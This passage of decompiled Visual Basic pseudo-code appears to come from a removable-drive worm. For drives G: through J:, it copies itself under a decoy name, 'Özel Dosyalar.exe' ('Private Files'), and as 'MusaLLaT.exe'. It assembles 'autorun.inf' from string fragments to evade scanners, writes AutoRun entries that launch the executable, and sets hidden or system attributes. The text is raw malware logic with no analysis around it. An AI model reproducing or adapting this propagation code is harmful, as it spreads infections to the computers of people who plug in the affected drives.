  loc_00440406:   var_BC = var_124.UnkVCall_00000014h
  loc_0044040B:   var_128 = var_BC
  loc_00440418:   If var_128 < 0 Then
  loc_0044042F:     call var_857C = global_00401058(var_128, var_124, global_00418ED0, 00000014h)
  loc_00440435:     var_204 = var_857C
  loc_0044043D:   Else
  loc_00440447:   End If
  loc_0044044D:   var_12C = var_BC
  loc_00440469:   var_A4 = var_12C.UnkVCall_00000050h
  loc_0044046E:   var_130 = var_A4
  loc_0044047B:   If var_130 < 0 Then
  loc_00440492:     call var_8580 = global_00401058(var_130, var_12C, global_00418EF0, 00000050h)
  loc_00440498:     var_208 = var_8580
  loc_004404A0:   Else
  loc_004404AA:   End If
  loc_004404B1:   If global_00460558 = 0 Then
  loc_004404BD:     call var_8584 = global_00401134(global_00418EE0, global_00460558)
  loc_004404C3:     var_20C = global_00460558
  loc_004404CF:   Else
  loc_004404D9:   End If
  loc_004404E1:   var_134 = var_20C
  loc_004404FD:   var_C0 = var_134.UnkVCall_00000014h
  loc_00440502:   var_138 = var_C0
  loc_0044050F:   If var_138 < 0 Then
  loc_00440526:     call var_8588 = global_00401058(var_138, var_134, global_00418ED0, 00000014h)
  loc_0044052C:     var_210 = var_8588
  loc_00440534:   Else
  loc_0044053E:   End If
  loc_00440544:   var_13C = var_C0
  loc_00440560:   var_A8 = var_13C.UnkVCall_00000058h
  loc_00440565:   var_140 = var_A8
  loc_00440572:   If var_140 < 0 Then
  loc_00440589:     call var_858C = global_00401058(var_140, var_13C, global_00418EF0, 00000058h)
  loc_0044058F:     var_214 = var_858C
  loc_00440597:   Else
  loc_004405A1:   End If
  loc_004405B2:   call var_8590 = global_00401044("\", var_A4, "G:\Özel Dosyalar.exe")
  loc_004405C0:   call var_8594 = global_004011AC
  loc_004405CE:   call var_8598 = global_00401044(var_A8, var_8594)
  loc_004405DC:   call var_859C = global_004011AC
  loc_004405E8:   call var_85A0 = global_00401044(".exe", var_859C)
  loc_004405F6:   call var_85A4 = global_004011AC
  loc_004405FD:   call var_85A8 = global_00401158(var_85A4)
  loc_00440628:   call var_85AC = global_00401150(00000005h, var_A4, var_AC, var_A8, var_B0, var_B4)
  loc_00440641:   call var_85B0 = global_0040102C(00000002h, var_BC, var_C0)
  loc_0044064A:   ' Referenced from: 004403A7
  loc_0044065B:   call var_85B4 = global_00401044("ut", "G:\a")
  loc_00440669:   call var_85B8 = global_004011AC
  loc_00440675:   call var_85BC = global_00401044("or", var_85B8)
  loc_00440683:   call var_85C0 = global_004011AC
  loc_0044068F:   call var_85C4 = global_00401044("un.", var_85C0)
  loc_0044069D:   call var_85C8 = global_004011AC
  loc_004406A9:   call var_85CC = global_00401044(global_004193A4, var_85C8)
  loc_004406B7:   call var_85D0 = global_004011AC
  loc_004406C3:   call var_85D4 = global_00401044("nf", var_85D0)
  loc_004406D1:   call var_85D8 = global_004011AC
  loc_004406D8:   call var_85DC = global_00401110(var_85D8)
  loc_00440703:   call var_85E0 = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_0044071D:   call var_85E4 = global_00401044("ut", "G:\a")
  loc_0044072B:   call var_85E8 = global_004011AC
  loc_00440737:   call var_85EC = global_00401044("or", var_85E8)
  loc_00440745:   call var_85F0 = global_004011AC
  loc_00440751:   call var_85F4 = global_00401044("un.", var_85F0)
  loc_0044075F:   call var_85F8 = global_004011AC
  loc_0044076B:   call var_85FC = global_00401044(global_004193A4, var_85F8)
  loc_00440779:   call var_8600 = global_004011AC
  loc_00440785:   call var_8604 = global_00401044("nf", var_8600)
  loc_00440793:   call var_8608 = global_004011AC
  loc_004407A1:   call var_860C = global_00401188(var_B8, var_8608)
  loc_004407A8:   var_8610 = DeleteFile(var_860C)
  loc_004407AD:   call var_8614 = global_00401054
  loc_004407DF:   call var_8618 = global_00401150(00000006h, var_A4, var_A8, var_AC, var_B0, var_B4, var_B8)
  loc_004407F9:   call var_861C = global_00401044("ut", "G:\a")
  loc_00440807:   call var_8620 = global_004011AC
  loc_00440813:   call var_8624 = global_00401044("or", var_8620)
  loc_00440821:   call var_8628 = global_004011AC
  loc_0044082D:   call var_862C = global_00401044("un.", var_8628)
  loc_0044083B:   call var_8630 = global_004011AC
  loc_00440847:   call var_8634 = global_00401044(global_004193A4, var_8630)
  loc_00440855:   call var_8638 = global_004011AC
  loc_00440861:   call var_863C = global_00401044("nf", var_8638)
  loc_0044086F:   call var_8640 = global_004011AC
  loc_0044087C:   call var_8644 = global_0040112C(00000002h, FFFFFFFFh, 00000001h, var_8640)
  loc_004408A7:   call var_8648 = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_004408C3:   call var_864C = global_004010F0(global_004194A0, 00000001h, "[AutoRun]")
  loc_004408DF:   call var_8650 = global_004010F0(global_004194A0, 00000001h, "Open=MusaLLaT.exe")
  loc_004408FB:   call var_8654 = global_004010F0(global_004194A0, 00000001h, "Shell\Open=Aç")
  loc_00440917:   call var_8658 = global_004010F0(global_004194A0, 00000001h, "Shell\Open\Command=MusaLLaT.exe")
  loc_00440929:   call var_865C = global_004010A0(00000001h)
  loc_0044093D:   call var_8660 = global_004011D0("G:\MusaLLaT.exe", 00000006h)
  loc_00440956:   call var_8664 = global_00401044("ut", "G:\a", 00000006h)
  loc_00440964:   call var_8668 = global_004011AC
  loc_00440970:   call var_866C = global_00401044("or", var_8668)
  loc_0044097E:   call var_8670 = global_004011AC
  loc_0044098A:   call var_8674 = global_00401044("un.", var_8670)
  loc_00440998:   call var_8678 = global_004011AC
  loc_004409A4:   call var_867C = global_00401044(global_004193A4, var_8678)
  loc_004409B2:   call var_8680 = global_004011AC
  loc_004409BE:   call var_8684 = global_00401044("nf", var_8680)
  loc_004409CC:   call var_8688 = global_004011AC
  loc_004409D3:   call var_868C = global_004011D0(var_8688)
  loc_004409FE:   call var_8690 = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_00440A2E:   call var_8694 = global_00401010
  loc_00440A34: End If
  loc_00440A3B: var_F8 = "H:\"
  loc_00440A5B: call var_8698 = global_0040118C
  loc_00440A6A: call var_869C = global_00401120(var_D0, 00000000h)
  loc_00440A78: call var_86A0 = global_004011AC
  loc_00440A84: call var_86A4 = global_004010B0(global_00418DE4, var_86A0)
  loc_00440A92: var_118 = var_86A4
  loc_00440AD3: call var_86A8 = global_00401174(var_E0, &H800B, var_A0, var_120)
  loc_00440AE1: call var_86AC = global_004010E4(var_F0, var_86A8)
  loc_00440AE8: call var_86B0 = global_00401090(var_86AC)
  loc_00440AFB: call var_86B4 = global_004011CC
  loc_00440B11: call var_86B8 = global_00401024(00000002h, var_D0, var_120)
  loc_00440B23: If var_86B0 Then
  loc_00440B37:   If global_00460558 = 0 Then
  loc_00440B43:     call var_86BC = global_00401134(global_00418EE0, global_00460558)
  loc_00440B49:     var_218 = global_00460558
  loc_00440B55:   Else
  loc_00440B5F:   End If
  loc_00440B67:   var_124 = var_218
  loc_00440B83:   var_BC = var_124.UnkVCall_00000014h
  loc_00440B88:   var_128 = var_BC
  loc_00440B95:   If var_128 < 0 Then
  loc_00440BAC:     call var_86C0 = global_00401058(var_128, var_124, global_00418ED0, 00000014h)
  loc_00440BB2:     var_21C = var_86C0
  loc_00440BBA:   Else
  loc_00440BC4:   End If
  loc_00440BCA:   var_12C = var_BC
  loc_00440BE6:   var_A4 = var_12C.UnkVCall_00000050h
  loc_00440BEB:   var_130 = var_A4
  loc_00440BF8:   If var_130 < 0 Then
  loc_00440C0F:     call var_86C4 = global_00401058(var_130, var_12C, global_00418EF0, 00000050h)
  loc_00440C15:     var_220 = var_86C4
  loc_00440C1D:   Else
  loc_00440C27:   End If
  loc_00440C2E:   If global_00460558 = 0 Then
  loc_00440C3A:     call var_86C8 = global_00401134(global_00418EE0, global_00460558)
  loc_00440C40:     var_224 = global_00460558
  loc_00440C4C:   Else
  loc_00440C56:   End If
  loc_00440C5E:   var_134 = var_224
  loc_00440C7A:   var_C0 = var_134.UnkVCall_00000014h
  loc_00440C7F:   var_138 = var_C0
  loc_00440C8C:   If var_138 < 0 Then
  loc_00440CA3:     call var_86CC = global_00401058(var_138, var_134, global_00418ED0, 00000014h)
  loc_00440CA9:     var_228 = var_86CC
  loc_00440CB1:   Else
  loc_00440CBB:   End If
  loc_00440CC1:   var_13C = var_C0
  loc_00440CDD:   var_A8 = var_13C.UnkVCall_00000058h
  loc_00440CE2:   var_140 = var_A8
  loc_00440CEF:   If var_140 < 0 Then
  loc_00440D06:     call var_86D0 = global_00401058(var_140, var_13C, global_00418EF0, 00000058h)
  loc_00440D0C:     var_22C = var_86D0
  loc_00440D14:   Else
  loc_00440D1E:   End If
  loc_00440D2F:   call var_86D4 = global_00401044("\", var_A4, "H:\MusaLLaT.exe")
  loc_00440D3D:   call var_86D8 = global_004011AC
  loc_00440D4B:   call var_86DC = global_00401044(var_A8, var_86D8)
  loc_00440D59:   call var_86E0 = global_004011AC
  loc_00440D65:   call var_86E4 = global_00401044(".exe", var_86E0)
  loc_00440D73:   call var_86E8 = global_004011AC
  loc_00440D7A:   call var_86EC = global_00401158(var_86E8)
  loc_00440DA5:   call var_86F0 = global_00401150(00000005h, var_A4, var_AC, var_A8, var_B0, var_B4)
  loc_00440DBE:   call var_86F4 = global_0040102C(00000002h, var_BC, var_C0)
  loc_00440DCE:   var_F8 = "H:\Özel Dosyalar.exe"
  loc_00440DEE:   call var_86F8 = global_0040118C
  loc_00440DFD:   call var_86FC = global_00401120(var_D0, 00000000h)
  loc_00440E0B:   call var_8700 = global_004011AC
  loc_00440E17:   call var_8704 = global_004010B0(global_00418DE4, var_8700)
  loc_00440E25:   var_118 = var_8704
  loc_00440E66:   call var_8708 = global_00401174(var_E0, &H800B, var_A0, var_120)
  loc_00440E74:   call var_870C = global_004010E4(var_F0, var_8708)
  loc_00440E7B:   call var_8710 = global_00401090(var_870C)
  loc_00440E8E:   call var_8714 = global_004011CC
  loc_00440EA4:   call var_8718 = global_00401024(00000002h, var_D0, var_120)
  loc_00440EB6:   If var_8710 Then
  loc_00440EB8:     GoTo loc_0044115B
  loc_00440EBD:   End If
  loc_00440ECB:   If global_00460558 = 0 Then
  loc_00440ED7:     call var_871C = global_00401134(global_00418EE0, global_00460558)
  loc_00440EDD:     var_230 = global_00460558
  loc_00440EE9:   Else
  loc_00440EF3:   End If
  loc_00440EFB:   var_124 = var_230
  loc_00440F17:   var_BC = var_124.UnkVCall_00000014h
  loc_00440F1C:   var_128 = var_BC
  loc_00440F29:   If var_128 < 0 Then
  loc_00440F40:     call var_8720 = global_00401058(var_128, var_124, global_00418ED0, 00000014h)
  loc_00440F46:     var_234 = var_8720
  loc_00440F4E:   Else
  loc_00440F58:   End If
  loc_00440F5E:   var_12C = var_BC
  loc_00440F7A:   var_A4 = var_12C.UnkVCall_00000050h
  loc_00440F7F:   var_130 = var_A4
  loc_00440F8C:   If var_130 < 0 Then
  loc_00440FA3:     call var_8724 = global_00401058(var_130, var_12C, global_00418EF0, 00000050h)
  loc_00440FA9:     var_238 = var_8724
  loc_00440FB1:   Else
  loc_00440FBB:   End If
  loc_00440FC2:   If global_00460558 = 0 Then
  loc_00440FCE:     call var_8728 = global_00401134(global_00418EE0, global_00460558)
  loc_00440FD4:     var_23C = global_00460558
  loc_00440FE0:   Else
  loc_00440FEA:   End If
  loc_00440FF2:   var_134 = var_23C
  loc_0044100E:   var_C0 = var_134.UnkVCall_00000014h
  loc_00441013:   var_138 = var_C0
  loc_00441020:   If var_138 < 0 Then
  loc_00441037:     call var_872C = global_00401058(var_138, var_134, global_00418ED0, 00000014h)
  loc_0044103D:     var_240 = var_872C
  loc_00441045:   Else
  loc_0044104F:   End If
  loc_00441055:   var_13C = var_C0
  loc_00441071:   var_A8 = var_13C.UnkVCall_00000058h
  loc_00441076:   var_140 = var_A8
  loc_00441083:   If var_140 < 0 Then
  loc_0044109A:     call var_8730 = global_00401058(var_140, var_13C, global_00418EF0, 00000058h)
  loc_004410A0:     var_244 = var_8730
  loc_004410A8:   Else
  loc_004410B2:   End If
  loc_004410C3:   call var_8734 = global_00401044("\", var_A4, "H:\Özel Dosyalar.exe")
  loc_004410D1:   call var_8738 = global_004011AC
  loc_004410DF:   call var_873C = global_00401044(var_A8, var_8738)
  loc_004410ED:   call var_8740 = global_004011AC
  loc_004410F9:   call var_8744 = global_00401044(".exe", var_8740)
  loc_00441107:   call var_8748 = global_004011AC
  loc_0044110E:   call var_874C = global_00401158(var_8748)
  loc_00441139:   call var_8750 = global_00401150(00000005h, var_A4, var_AC, var_A8, var_B0, var_B4)
  loc_00441152:   call var_8754 = global_0040102C(00000002h, var_BC, var_C0)
  loc_0044115B:   ' Referenced from: 00440EB8
  loc_0044116C:   call var_8758 = global_00401044("ut", "H:\a")
  loc_0044117A:   call var_875C = global_004011AC
  loc_00441186:   call var_8760 = global_00401044("or", var_875C)
  loc_00441194:   call var_8764 = global_004011AC
  loc_004411A0:   call var_8768 = global_00401044("un.", var_8764)
  loc_004411AE:   call var_876C = global_004011AC
  loc_004411BA:   call var_8770 = global_00401044(global_004193A4, var_876C)
  loc_004411C8:   call var_8774 = global_004011AC
  loc_004411D4:   call var_8778 = global_00401044("nf", var_8774)
  loc_004411E2:   call var_877C = global_004011AC
  loc_004411E9:   call var_8780 = global_00401110(var_877C)
  loc_00441214:   call var_8784 = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_0044122E:   call var_8788 = global_00401044("ut", "H:\a")
  loc_0044123C:   call var_878C = global_004011AC
  loc_00441248:   call var_8790 = global_00401044("or", var_878C)
  loc_00441256:   call var_8794 = global_004011AC
  loc_00441262:   call var_8798 = global_00401044("un.", var_8794)
  loc_00441270:   call var_879C = global_004011AC
  loc_0044127C:   call var_87A0 = global_00401044(global_004193A4, var_879C)
  loc_0044128A:   call var_87A4 = global_004011AC
  loc_00441296:   call var_87A8 = global_00401044("nf", var_87A4)
  loc_004412A4:   call var_87AC = global_004011AC
  loc_004412B2:   call var_87B0 = global_00401188(var_B8, var_87AC)
  loc_004412B9:   var_87B4 = DeleteFile(var_87B0)
  loc_004412BE:   call var_87B8 = global_00401054
  loc_004412F0:   call var_87BC = global_00401150(00000006h, var_A4, var_A8, var_AC, var_B0, var_B4, var_B8)
  loc_0044130A:   call var_87C0 = global_00401044("ut", "H:\a")
  loc_00441318:   call var_87C4 = global_004011AC
  loc_00441324:   call var_87C8 = global_00401044("or", var_87C4)
  loc_00441332:   call var_87CC = global_004011AC
  loc_0044133E:   call var_87D0 = global_00401044("un.", var_87CC)
  loc_0044134C:   call var_87D4 = global_004011AC
  loc_00441358:   call var_87D8 = global_00401044(global_004193A4, var_87D4)
  loc_00441366:   call var_87DC = global_004011AC
  loc_00441372:   call var_87E0 = global_00401044("nf", var_87DC)
  loc_00441380:   call var_87E4 = global_004011AC
  loc_0044138D:   call var_87E8 = global_0040112C(00000002h, FFFFFFFFh, 00000001h, var_87E4)
  loc_004413B8:   call var_87EC = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_004413D4:   call var_87F0 = global_004010F0(global_004194A0, 00000001h, "[AutoRun]")
  loc_004413F0:   call var_87F4 = global_004010F0(global_004194A0, 00000001h, "Open=MusaLLaT.exe")
  loc_0044140C:   call var_87F8 = global_004010F0(global_004194A0, 00000001h, "Shell\Open=Aç")
  loc_00441428:   call var_87FC = global_004010F0(global_004194A0, 00000001h, "Shell\Open\Command=MusaLLaT.exe")
  loc_0044143A:   call var_8800 = global_004010A0(00000001h)
  loc_0044144E:   call var_8804 = global_004011D0("H:\MusaLLaT.exe", 00000006h)
  loc_00441467:   call var_8808 = global_00401044("ut", "H:\a", 00000006h)
  loc_00441475:   call var_880C = global_004011AC
  loc_00441481:   call var_8810 = global_00401044("or", var_880C)
  loc_0044148F:   call var_8814 = global_004011AC
  loc_0044149B:   call var_8818 = global_00401044("un.", var_8814)
  loc_004414A9:   call var_881C = global_004011AC
  loc_004414B5:   call var_8820 = global_00401044(global_004193A4, var_881C)
  loc_004414C3:   call var_8824 = global_004011AC
  loc_004414CF:   call var_8828 = global_00401044("nf", var_8824)
  loc_004414DD:   call var_882C = global_004011AC
  loc_004414E4:   call var_8830 = global_004011D0(var_882C)
  loc_0044150F:   call var_8834 = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_0044153F:   call var_8838 = global_00401010
  loc_00441545: End If
  loc_0044154C: var_F8 = "I:\"
  loc_0044156C: call var_883C = global_0040118C
  loc_0044157B: call var_8840 = global_00401120(var_D0, 00000000h)
  loc_00441589: call var_8844 = global_004011AC
  loc_00441595: call var_8848 = global_004010B0(global_00418DE4, var_8844)
  loc_004415A3: var_118 = var_8848
  loc_004415E1: call var_884C = global_00401174(var_E0, &H800B, var_30, var_120)
  loc_004415EF: call var_8850 = global_004010E4(var_F0, var_884C)
  loc_004415F6: call var_8854 = global_00401090(var_8850)
  loc_00441609: call var_8858 = global_004011CC
  loc_0044161F: call var_885C = global_00401024(00000002h, var_D0, var_120)
  loc_00441631: If var_8854 Then
  loc_00441645:   If global_00460558 = 0 Then
  loc_00441651:     call var_8860 = global_00401134(global_00418EE0, global_00460558)
  loc_00441657:     var_248 = global_00460558
  loc_00441663:   Else
  loc_0044166D:   End If
  loc_00441675:   var_124 = var_248
  loc_00441691:   var_BC = var_124.UnkVCall_00000014h
  loc_00441696:   var_128 = var_BC
  loc_004416A3:   If var_128 < 0 Then
  loc_004416BA:     call var_8864 = global_00401058(var_128, var_124, global_00418ED0, 00000014h)
  loc_004416C0:     var_24C = var_8864
  loc_004416C8:   Else
  loc_004416D2:   End If
  loc_004416D8:   var_12C = var_BC
  loc_004416F4:   var_A4 = var_12C.UnkVCall_00000050h
  loc_004416F9:   var_130 = var_A4
  loc_00441706:   If var_130 < 0 Then
  loc_0044171D:     call var_8868 = global_00401058(var_130, var_12C, global_00418EF0, 00000050h)
  loc_00441723:     var_250 = var_8868
  loc_0044172B:   Else
  loc_00441735:   End If
  loc_0044173C:   If global_00460558 = 0 Then
  loc_00441748:     call var_886C = global_00401134(global_00418EE0, global_00460558)
  loc_0044174E:     var_254 = global_00460558
  loc_0044175A:   Else
  loc_00441764:   End If
  loc_0044176C:   var_134 = var_254
  loc_00441788:   var_C0 = var_134.UnkVCall_00000014h
  loc_0044178D:   var_138 = var_C0
  loc_0044179A:   If var_138 < 0 Then
  loc_004417B1:     call var_8870 = global_00401058(var_138, var_134, global_00418ED0, 00000014h)
  loc_004417B7:     var_258 = var_8870
  loc_004417BF:   Else
  loc_004417C9:   End If
  loc_004417CF:   var_13C = var_C0
  loc_004417EB:   var_A8 = var_13C.UnkVCall_00000058h
  loc_004417F0:   var_140 = var_A8
  loc_004417FD:   If var_140 < 0 Then
  loc_00441814:     call var_8874 = global_00401058(var_140, var_13C, global_00418EF0, 00000058h)
  loc_0044181A:     var_25C = var_8874
  loc_00441822:   Else
  loc_0044182C:   End If
  loc_0044183D:   call var_8878 = global_00401044("\", var_A4, "I:\MusaLLaT.exe")
  loc_0044184B:   call var_887C = global_004011AC
  loc_00441859:   call var_8880 = global_00401044(var_A8, var_887C)
  loc_00441867:   call var_8884 = global_004011AC
  loc_00441873:   call var_8888 = global_00401044(".exe", var_8884)
  loc_00441881:   call var_888C = global_004011AC
  loc_00441888:   call var_8890 = global_00401158(var_888C)
  loc_004418B3:   call var_8894 = global_00401150(00000005h, var_A4, var_AC, var_A8, var_B0, var_B4)
  loc_004418CC:   call var_8898 = global_0040102C(00000002h, var_BC, var_C0)
  loc_004418DC:   var_F8 = "I:\Özel Dosyalar.exe"
  loc_004418FC:   call var_889C = global_0040118C
  loc_0044190B:   call var_88A0 = global_00401120(var_D0, 00000000h)
  loc_00441919:   call var_88A4 = global_004011AC
  loc_00441925:   call var_88A8 = global_004010B0(global_00418DE4, var_88A4)
  loc_00441933:   var_118 = var_88A8
  loc_00441971:   call var_88AC = global_00401174(var_E0, &H800B, var_30, var_120)
  loc_0044197F:   call var_88B0 = global_004010E4(var_F0, var_88AC)
  loc_00441986:   call var_88B4 = global_00401090(var_88B0)
  loc_00441999:   call var_88B8 = global_004011CC
  loc_004419AF:   call var_88BC = global_00401024(00000002h, var_D0, var_120)
  loc_004419C1:   If var_88B4 Then
  loc_004419C3:     GoTo loc_00441C66
  loc_004419C8:   End If
  loc_004419D6:   If global_00460558 = 0 Then
  loc_004419E2:     call var_88C0 = global_00401134(global_00418EE0, global_00460558)
  loc_004419E8:     var_260 = global_00460558
  loc_004419F4:   Else
  loc_004419FE:   End If
  loc_00441A06:   var_124 = var_260
  loc_00441A22:   var_BC = var_124.UnkVCall_00000014h
  loc_00441A27:   var_128 = var_BC
  loc_00441A34:   If var_128 < 0 Then
  loc_00441A4B:     call var_88C4 = global_00401058(var_128, var_124, global_00418ED0, 00000014h)
  loc_00441A51:     var_264 = var_88C4
  loc_00441A59:   Else
  loc_00441A63:   End If
  loc_00441A69:   var_12C = var_BC
  loc_00441A85:   var_A4 = var_12C.UnkVCall_00000050h
  loc_00441A8A:   var_130 = var_A4
  loc_00441A97:   If var_130 < 0 Then
  loc_00441AAE:     call var_88C8 = global_00401058(var_130, var_12C, global_00418EF0, 00000050h)
  loc_00441AB4:     var_268 = var_88C8
  loc_00441ABC:   Else
  loc_00441AC6:   End If
  loc_00441ACD:   If global_00460558 = 0 Then
  loc_00441AD9:     call var_88CC = global_00401134(global_00418EE0, global_00460558)
  loc_00441ADF:     var_26C = global_00460558
  loc_00441AEB:   Else
  loc_00441AF5:   End If
  loc_00441AFD:   var_134 = var_26C
  loc_00441B19:   var_C0 = var_134.UnkVCall_00000014h
  loc_00441B1E:   var_138 = var_C0
  loc_00441B2B:   If var_138 < 0 Then
  loc_00441B42:     call var_88D0 = global_00401058(var_138, var_134, global_00418ED0, 00000014h)
  loc_00441B48:     var_270 = var_88D0
  loc_00441B50:   Else
  loc_00441B5A:   End If
  loc_00441B60:   var_13C = var_C0
  loc_00441B7C:   var_A8 = var_13C.UnkVCall_00000058h
  loc_00441B81:   var_140 = var_A8
  loc_00441B8E:   If var_140 < 0 Then
  loc_00441BA5:     call var_88D4 = global_00401058(var_140, var_13C, global_00418EF0, 00000058h)
  loc_00441BAB:     var_274 = var_88D4
  loc_00441BB3:   Else
  loc_00441BBD:   End If
  loc_00441BCE:   call var_88D8 = global_00401044("\", var_A4, "I:\Özel Dosyalar.exe")
  loc_00441BDC:   call var_88DC = global_004011AC
  loc_00441BEA:   call var_88E0 = global_00401044(var_A8, var_88DC)
  loc_00441BF8:   call var_88E4 = global_004011AC
  loc_00441C04:   call var_88E8 = global_00401044(".exe", var_88E4)
  loc_00441C12:   call var_88EC = global_004011AC
  loc_00441C19:   call var_88F0 = global_00401158(var_88EC)
  loc_00441C44:   call var_88F4 = global_00401150(00000005h, var_A4, var_AC, var_A8, var_B0, var_B4)
  loc_00441C5D:   call var_88F8 = global_0040102C(00000002h, var_BC, var_C0)
  loc_00441C66:   ' Referenced from: 004419C3
  loc_00441C77:   call var_88FC = global_00401044("ut", "I:\a")
  loc_00441C85:   call var_8900 = global_004011AC
  loc_00441C91:   call var_8904 = global_00401044("or", var_8900)
  loc_00441C9F:   call var_8908 = global_004011AC
  loc_00441CAB:   call var_890C = global_00401044("un.", var_8908)
  loc_00441CB9:   call var_8910 = global_004011AC
  loc_00441CC5:   call var_8914 = global_00401044(global_004193A4, var_8910)
  loc_00441CD3:   call var_8918 = global_004011AC
  loc_00441CDF:   call var_891C = global_00401044("nf", var_8918)
  loc_00441CED:   call var_8920 = global_004011AC
  loc_00441CF4:   call var_8924 = global_00401110(var_8920)
  loc_00441D1F:   call var_8928 = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_00441D39:   call var_892C = global_00401044("ut", "I:\a")
  loc_00441D47:   call var_8930 = global_004011AC
  loc_00441D53:   call var_8934 = global_00401044("or", var_8930)
  loc_00441D61:   call var_8938 = global_004011AC
  loc_00441D6D:   call var_893C = global_00401044("un.", var_8938)
  loc_00441D7B:   call var_8940 = global_004011AC
  loc_00441D87:   call var_8944 = global_00401044(global_004193A4, var_8940)
  loc_00441D95:   call var_8948 = global_004011AC
  loc_00441DA1:   call var_894C = global_00401044("nf", var_8948)
  loc_00441DAF:   call var_8950 = global_004011AC
  loc_00441DBD:   call var_8954 = global_00401188(var_B8, var_8950)
  loc_00441DC4:   var_8958 = DeleteFile(var_8954)
  loc_00441DC9:   call var_895C = global_00401054
  loc_00441DFB:   call var_8960 = global_00401150(00000006h, var_A4, var_A8, var_AC, var_B0, var_B4, var_B8)
  loc_00441E15:   call var_8964 = global_00401044("ut", "I:\a")
  loc_00441E23:   call var_8968 = global_004011AC
  loc_00441E2F:   call var_896C = global_00401044("or", var_8968)
  loc_00441E3D:   call var_8970 = global_004011AC
  loc_00441E49:   call var_8974 = global_00401044("un.", var_8970)
  loc_00441E57:   call var_8978 = global_004011AC
  loc_00441E63:   call var_897C = global_00401044(global_004193A4, var_8978)
  loc_00441E71:   call var_8980 = global_004011AC
  loc_00441E7D:   call var_8984 = global_00401044("nf", var_8980)
  loc_00441E8B:   call var_8988 = global_004011AC
  loc_00441E98:   call var_898C = global_0040112C(00000002h, FFFFFFFFh, 00000001h, var_8988)
  loc_00441EC3:   call var_8990 = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_00441EDF:   call var_8994 = global_004010F0(global_004194A0, 00000001h, "[AutoRun]")
  loc_00441EFB:   call var_8998 = global_004010F0(global_004194A0, 00000001h, "Open=MusaLLaT.exe")
  loc_00441F17:   call var_899C = global_004010F0(global_004194A0, 00000001h, "Shell\Open=Aç")
  loc_00441F33:   call var_89A0 = global_004010F0(global_004194A0, 00000001h, "Shell\Open\Command=MusaLLaT.exe")
  loc_00441F45:   call var_89A4 = global_004010A0(00000001h)
  loc_00441F59:   call var_89A8 = global_004011D0("I:\MusaLLaT.exe", 00000006h)
  loc_00441F72:   call var_89AC = global_00401044("ut", "I:\a", 00000006h)
  loc_00441F80:   call var_89B0 = global_004011AC
  loc_00441F8C:   call var_89B4 = global_00401044("or", var_89B0)
  loc_00441F9A:   call var_89B8 = global_004011AC
  loc_00441FA6:   call var_89BC = global_00401044("un.", var_89B8)
  loc_00441FB4:   call var_89C0 = global_004011AC
  loc_00441FC0:   call var_89C4 = global_00401044(global_004193A4, var_89C0)
  loc_00441FCE:   call var_89C8 = global_004011AC
  loc_00441FDA:   call var_89CC = global_00401044("nf", var_89C8)
  loc_00441FE8:   call var_89D0 = global_004011AC
  loc_00441FEF:   call var_89D4 = global_004011D0(var_89D0)
  loc_0044201A:   call var_89D8 = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_00442047:   call var_89DC = global_00401010
  loc_0044204D: End If
  loc_00442054: var_F8 = "J:\"
  loc_00442074: call var_89E0 = global_0040118C
  loc_00442083: call var_89E4 = global_00401120(var_D0, 00000000h)
  loc_00442091: call var_89E8 = global_004011AC
  loc_0044209D: call var_89EC = global_004010B0(global_00418DE4, var_89E8)
  loc_004420AB: var_118 = var_89EC
  loc_004420E9: call var_89F0 = global_00401174(var_E0, &H800B, var_40, var_120)
  loc_004420F7: call var_89F4 = global_004010E4(var_F0, var_89F0)
  loc_004420FE: call var_89F8 = global_00401090(var_89F4)
  loc_00442111: call var_89FC = global_004011CC
  loc_00442127: call var_8A00 = global_00401024(00000002h, var_D0, var_120)
  loc_00442139: If var_89F8 Then
  loc_0044214D:   If global_00460558 = 0 Then
  loc_00442159:     call var_8A04 = global_00401134(global_00418EE0, global_00460558)
  loc_0044215F:     var_278 = global_00460558
  loc_0044216B:   Else
  loc_00442175:   End If
  loc_0044217D:   var_124 = var_278
  loc_00442199:   var_BC = var_124.UnkVCall_00000014h
  loc_0044219E:   var_128 = var_BC
  loc_004421AB:   If var_128 < 0 Then
  loc_004421C2:     call var_8A08 = global_00401058(var_128, var_124, global_00418ED0, 00000014h)
  loc_004421C8:     var_27C = var_8A08
  loc_004421D0:   Else
  loc_004421DA:   End If
  loc_004421E0:   var_12C = var_BC
  loc_004421FC:   var_A4 = var_12C.UnkVCall_00000050h
  loc_00442201:   var_130 = var_A4
  loc_0044220E:   If var_130 < 0 Then
  loc_00442225:     call var_8A0C = global_00401058(var_130, var_12C, global_00418EF0, 00000050h)
  loc_0044222B:     var_280 = var_8A0C
  loc_00442233:   Else
  loc_0044223D:   End If
  loc_00442244:   If global_00460558 = 0 Then
  loc_00442250:     call var_8A10 = global_00401134(global_00418EE0, global_00460558)
  loc_00442256:     var_284 = global_00460558
  loc_00442262:   Else
  loc_0044226C:   End If
  loc_00442274:   var_134 = var_284
  loc_00442290:   var_C0 = var_134.UnkVCall_00000014h
  loc_00442295:   var_138 = var_C0
  loc_004422A2:   If var_138 < 0 Then
  loc_004422B9:     call var_8A14 = global_00401058(var_138, var_134, global_00418ED0, 00000014h)
  loc_004422BF:     var_288 = var_8A14
  loc_004422C7:   Else
  loc_004422D1:   End If
  loc_004422D7:   var_13C = var_C0
  loc_004422F3:   var_A8 = var_13C.UnkVCall_00000058h
  loc_004422F8:   var_140 = var_A8
  loc_00442305:   If var_140 < 0 Then
  loc_0044231C:     call var_8A18 = global_00401058(var_140, var_13C, global_00418EF0, 00000058h)
  loc_00442322:     var_28C = var_8A18
  loc_0044232A:   Else
  loc_00442334:   End If
  loc_00442345:   call var_8A1C = global_00401044("\", var_A4, "J:\MusaLLaT.exe")
  loc_00442353:   call var_8A20 = global_004011AC
  loc_00442361:   call var_8A24 = global_00401044(var_A8, var_8A20)
  loc_0044236F:   call var_8A28 = global_004011AC
